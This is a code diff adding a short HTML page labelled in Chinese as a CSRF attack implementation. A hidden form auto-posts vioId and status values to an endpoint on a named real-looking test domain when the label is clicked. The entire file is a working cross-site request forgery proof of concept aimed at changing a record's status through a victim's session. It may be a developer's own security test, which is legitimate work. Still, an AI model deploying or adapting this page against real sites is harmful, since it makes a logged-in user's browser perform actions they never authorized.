@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+
+<body>
+    <div id="but">csrf 攻击实现</div>
+    <form id="myform" method="POST" name="transfer" action="https://check-test.rightknights.com/check/risk/vio/status">
+        <input type="hidden" name="vioId" value="50">
+        <input type="hidden" name="status" value="2">
+    </form>
+    <script type="text/javascript">
+        var button = document.querySelector('#but')
+        button.addEventListener('click', function () {
+            document.getElementById('myform').submit()
+        })
+    </script>
+</body>
+
+</html>
